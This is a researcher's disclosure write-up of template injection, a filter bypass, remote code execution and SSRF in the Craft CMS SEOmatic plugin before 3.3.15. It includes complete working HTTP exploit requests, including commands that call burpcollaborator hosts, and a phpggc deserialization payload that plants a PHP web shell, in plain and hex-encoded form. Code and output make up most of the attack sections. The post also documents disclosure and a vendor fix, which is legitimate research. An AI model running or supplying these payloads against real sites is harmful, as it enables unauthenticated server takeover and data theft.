# Multiple vulnerabilities at Craft CMS SEOmatic plugin


A couple of months ago I was performing retest of an interesting Server Side Request Forgery (SSRF) vulnerability at debug GET parameter. Developers disabled it on load balancer and I decided to perform some fuzzing with awesome Burp Suite plugin [param-miner](https://github.com/PortSwigger/param-miner). There was no way to exploit SSRF but interesting parameter `action` was discovered. Future investigation show that it is default behavior of [Craft CMS](https://craftcms.com/). Fast search by public CVE retured promising vulnerability CVE-2018-14716. You can find information about issue and way to exploit it at blog post [0xB455](http://ha.cker.info/exploitation-of-server-side-template-injection-with-craft-cms-plguin-seomatic/). When you will finish reading article return and we find way to bypass fix and execute code at vulnerable system.
<!--more-->

### Initial setup of vulnerable CMS
Before we start let's prepare our own library. Craft CMS Seomatic plugin version before 3.3.15 required to reproduce issues. Intallation guide can be found at official [documentation](https://craftcms.com/docs/3.x/installation.html) plugin can be found at [plugin store](https://plugins.craftcms.com/seomatic). Vulnerable application had Pro license and to test localy I made small fix at file
⁨craft⁩/vendor⁩/⁨craftcms⁩/⁨cms⁩/⁨src⁩/⁨controllers/GraphqlController.php:57

```php
 // Craft::$app->requireEdition(Craft::Pro);
```

### Security protection bypass
Now everything is ready to get started. Fix of CVE-2018-14716 is implemented at function sanitizeUrl(). It takes user supplied parameter url decode it and replace all strings with following rule `/{.*}/` to delete all Twig template special symbols. Vulnerable code:

```php

	public static function sanitizeUrl(string $url, bool $checkStatus = true): string
    {
        // Remove the query string
        $url = UrlHelper::stripQueryString($url);
        // HTML decode the entities, then strip out any tags
        $url = html_entity_decode($url, ENT_NOQUOTES, 'UTF-8');
        $url = urldecode($url);
        $url = strip_tags($url);

        // If this is a >= 400 status code, set the canonical URL to nothing
        if ($checkStatus && Craft::$app->getResponse()->statusCode >= 400) {
            $url = '';
        }
        // Remove any Twig tags that somehow are present in the incoming URL
        /** @noinspection CallableParameterUseCaseInTypeContextInspection */
        $result = preg_replace('/{.*}/', '', $url);
        // var_dump($result);
        if (!empty($result) && $result) {
            $url = $result;
        } else {
            $url = '';
        }

        return $url;
    }
```
Hopefully for attacker Regular Expressions (Perl-Compatible) have some funny behavior that will allows to bypass such protection. Let's take a look at [docs](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) 
```
s (PCRE_DOTALL) 
If this modifier is set, a dot metacharacter in the pattern matches all characters, including newlines. Without it, newlines are excluded.
```
Finally to bypass protection malicious user should split it template injection payload with new line symbols. Proof of Concept can be presented as `{{\n13*13\n}}`. 
Seomatic plugin API was disabled at target assets - it is another major obstacle to seccusefully inject Twig template. By default it should be available at endpoint `/actions/seomatic/meta-container/all-meta-containers?uri=` and if you are lucky you can skip next section. 
![Seomatic plugin API](images/seomatic-config.png)

### Graphql
There is another way to exploit vulnerability - Graphql Controller. By default graphql query available at `/actions/graphql/api`. Seomatic plugin register its seomatic query by default. We can get access to Secret information with unauthorization request to graphql api with `uri` value `{{\n1337*13\n}}`.

```html
POST /index.php?p=admin/actions/graphql/api HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/admin/seomatic/plugin
X-Requested-With: XMLHttpRequest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

query=query{seomatic(uri:"{{\n1337*13\n}}"){metaTitleContainer,metaTagContainer}}

```
![Seomatic SSTI](images/seomatic-ssti-1337.png)

### Remote code execution by unserialize
The old Remote Code Execution exploit available at internet looks like `{{craft.app.view.evaluateDynamicContent('print(system("ls"))')}}` but unfortunately for us it was disabled at version 3.5.0. At first I was trying to get RCE chain by unserialize function at `craft.app.getQueue().unserializeMessage()`. The only working chain at Craft CMS environment is *Guzzle/FW1* but it has some limitations that should be addressed first. Serialized object contains `{}` chars. We should modify string to exclude them from payload. As you may know PHP support `\\x00` encoding. I modified **phpggc** tool to print out exploit in new encoding. So it looks like:

```bash
./phpggc Guzzle/FW1 /tmp/exploit.txt data -s    
O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"%00GuzzleHttp\Cookie\FileCookieJar%00filename"%3Bs:16:"/tmp/exploit.txt"%3Bs:52:"%00GuzzleHttp\Cookie\FileCookieJar%00storeSessionCookies"%3Bb:1%3Bs:36:"%00GuzzleHttp\Cookie\CookieJar%00cookies"%3Ba:1:{i:0%3BO:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"%00GuzzleHttp\Cookie\SetCookie%00data"%3Ba:3:{s:7:"Expires"%3Bi:1%3Bs:7:"Discard"%3Bb:0%3Bs:5:"Value"%3Bs:80:"<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd'])%3B system($cmd)%3B }?>%0A"%3B}}}s:39:"%00GuzzleHttp\Cookie\CookieJar%00strictMode"%3BN%3B}

\\x4f\\x3a\\x33\\x31\\x3a\\x22\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x46\\x69\\x6c\\x65\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x4a\\x61\\x72\\x22\\x3a\\x34\\x3a\\x7b\\x73\\x3a\\x34\\x31\\x3a\\x22\\x00\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x46\\x69\\x6c\\x65\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x4a\\x61\\x72\\x00\\x66\\x69\\x6c\\x65\\x6e\\x61\\x6d\\x65\\x22\\x3b\\x73\\x3a\\x31\\x36\\x3a\\x22\\x2f\\x74\\x6d\\x70\\x2f\\x65\\x78\\x70\\x6c\\x6f\\x69\\x74\\x2e\\x74\\x78\\x74\\x22\\x3b\\x73\\x3a\\x35\\x32\\x3a\\x22\\x00\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x46\\x69\\x6c\\x65\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x4a\\x61\\x72\\x00\\x73\\x74\\x6f\\x72\\x65\\x53\\x65\\x73\\x73\\x69\\x6f\\x6e\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x73\\x22\\x3b\\x62\\x3a\\x31\\x3b\\x73\\x3a\\x33\\x36\\x3a\\x22\\x00\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x4a\\x61\\x72\\x00\\x63\\x6f\\x6f\\x6b\\x69\\x65\\x73\\x22\\x3b\\x61\\x3a\\x31\\x3a\\x7b\\x69\\x3a\\x30\\x3b\\x4f\\x3a\\x32\\x37\\x3a\\x22\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x53\\x65\\x74\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x22\\x3a\\x31\\x3a\\x7b\\x73\\x3a\\x33\\x33\\x3a\\x22\\x00\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x53\\x65\\x74\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x00\\x64\\x61\\x74\\x61\\x22\\x3b\\x61\\x3a\\x33\\x3a\\x7b\\x73\\x3a\\x37\\x3a\\x22\\x45\\x78\\x70\\x69\\x72\\x65\\x73\\x22\\x3b\\x69\\x3a\\x31\\x3b\\x73\\x3a\\x37\\x3a\\x22\\x44\\x69\\x73\\x63\\x61\\x72\\x64\\x22\\x3b\\x62\\x3a\\x30\\x3b\\x73\\x3a\\x35\\x3a\\x22\\x56\\x61\\x6c\\x75\\x65\\x22\\x3b\\x73\\x3a\\x38\\x30\\x3a\\x22\\x3c\\x3f\\x70\\x68\\x70\\x20\\x69\\x66\\x28\\x69\\x73\\x73\\x65\\x74\\x28\\x24\\x5f\\x52\\x45\\x51\\x55\\x45\\x53\\x54\\x5b\\x27\\x63\\x6d\\x64\\x27\\x5d\\x29\\x29\\x7b\\x20\\x24\\x63\\x6d\\x64\\x20\\x3d\\x20\\x28\\x24\\x5f\\x52\\x45\\x51\\x55\\x45\\x53\\x54\\x5b\\x27\\x63\\x6d\\x64\\x27\\x5d\\x29\\x3b\\x20\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x24\\x63\\x6d\\x64\\x29\\x3b\\x20\\x7d\\x3f\\x3e\\x0a\\x22\\x3b\\x7d\\x7d\\x7d\\x73\\x3a\\x33\\x39\\x3a\\x22\\x00\\x47\\x75\\x7a\\x7a\\x6c\\x65\\x48\\x74\\x74\\x70\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x5c\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x4a\\x61\\x72\\x00\\x73\\x74\\x72\\x69\\x63\\x74\\x4d\\x6f\\x64\\x65\\x22\\x3b\\x4e\\x3b\\x7d
```
![Seomatic SSTI](images/seomatic-ssti-unserialize.png)

Seccusesfully exploitation of vulnerability will creates `exploit.txt ` at `/tmp/` folder.

```bash
doge in ~/phpggc on master ● ● λ cat /tmp/exploit.txt 
[{"Expires":1,"Discard":false,"Value":"<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); }?>\n"}]%                                    
doge in ~/IdeaProjects/GIT/phpggc on master ● ● λ cat data  
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); }?>
doge in ~/phpggc on master ● ● λ 

```

# Remote code execution 
A few days later I found better way to exploit this vulnerability. As I mentioned earlier method `evaluateDynamicContent` was disabled at Craft CMS but it was not at **Yii::Base::View**. As you may already know Twig template engine support variables. We can use them to create new **Yii::Base::View** object and call `evaluateDynamicContent` method directly and bypass protection mechanism. Final exploit will looks like.

```html
POST /index.php?p=admin/actions/graphql/api HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/admin/seomatic/plugin
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: CRAFT_CSRF_TOKEN=65b1642b30dd16579ca51699a3392fc9a24f9802f181a5b0d1998c2f8464c15da%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A208%3A%22nzSA34Nh2-246okgxBRjTXG_qKeqgdezSL2hsKFH%7C0e8798e23345a2260452e8f25ae6cd879da745e39be67e71f9c1734da5eb2048nzSA34Nh2-246okgxBRjTXG_qKeqgdezSL2hsKFH%7C1%7C%242y%2413%24wK%2FYH5krqJrSeROBaQ9jbOjKdpMg2hHqVkwJij8Gb7z6vLkLwzohS%22%3B%7D; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 262

query=query{seomatic(uri:"{%\nset+dum={\n'class':'yii\\\\base\\\\View'\n}\n%}{%\nset+dummy=create(dum)\n%}{{\ndummy.evaluateDynamicContent('echo+system(\\'host+3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net\\');')\n}}"){metaTitleContainer,metaTagContainer}}
```

```html
HTTP/1.1 200 OK
Server: nginx/1.17.3
Date: Fri, 30 Oct 2020 14:40:37 GMT
Content-Type: application/json; charset=UTF-8
Connection: close
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Powered-By: Craft CMS
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Authorization, Content-Type, X-Craft-Token
Access-Control-Allow-Origin: *
Last-Modified: Friday, 30-Oct-2020 14:40:37 UTC
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
Content-Length: 779

{"data":{"seomatic":{"metaTitleContainer":"<title>🚧 craft</title>","metaTagContainer":"<meta name=\"generator\" content=\"SEOmatic\"><meta name=\"referrer\" content=\"no-referrer-when-downgrade\"><meta name=\"robots\" content=\"none\"><meta content=\"ru_RU\" property=\"og:locale\"><meta content=\"craft\" property=\"og:site_name\"><meta content=\"website\" property=\"og:type\"><meta content=\"127.0.0.1:8000/3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net has address 52.16.21.24\n3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net mail is handled by 1 mail.3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net.\n3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net mail is handled by 1 mail.3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net.\" property=\"og:url\">"}}}
```

![Seomatic RCE](images/seomatic-rce.png)

### Awesome calc
Proof-of-Concept
![Seomatic RCE PoC](images/seomatic-rce-poc.mv)

# Bonus. Server Side Request Forgery

Unauthorized Server Side Request Forgery at Craft CMS Seomatic plugin version before 3.3.15

### Details about vulnerability 
Controller FileController allows anonymous access by default. Function looks like:
```php
        $url = base64_decode($url);
        $robots = base64_decode($robots);
        $canonical = base64_decode($canonical);
        $url = UrlHelper::absoluteUrlWithProtocol($url);
        $contents = file_get_contents($url);
        $response = Craft::$app->getResponse();
```
Url parameter is base64 encoded malicious user host `http://3eif8shsnxsuvuyupt9o4bfwnntdh2.burpcollaborator.net/` is `aHR0cDovLzNlaWY4c2hzbnhzdXZ1eXVwdDlvNGJmd25udGRoMi5idXJwY29sbGFib3JhdG9yLm5ldC8=`

### Step to reproduce

```html
GET /index.php?action=seomatic/file/seo-file-link&url=aHR0cDovLzNlaWY4c2hzbnhzdXZ1eXVwdDlvNGJmd25udGRoMi5idXJwY29sbGFib3JhdG9yLm5ldC8= HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/admin/seomatic/plugin
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
![Seomatic SSRF](images/seomatic-ssrf.png)
![Seomatic SSRF](images/seomatic-ssrf-callback.png)

# Timeline

1. 13 Aug 2020 Vulnerabilities were discovered
2. 14 Aug 2020 Nystudio107 was informed about the vulnerabilities
3. 17 Aug 2020 fix released
4. CVE-ID to be done
5. XX Xxx Public disclosure
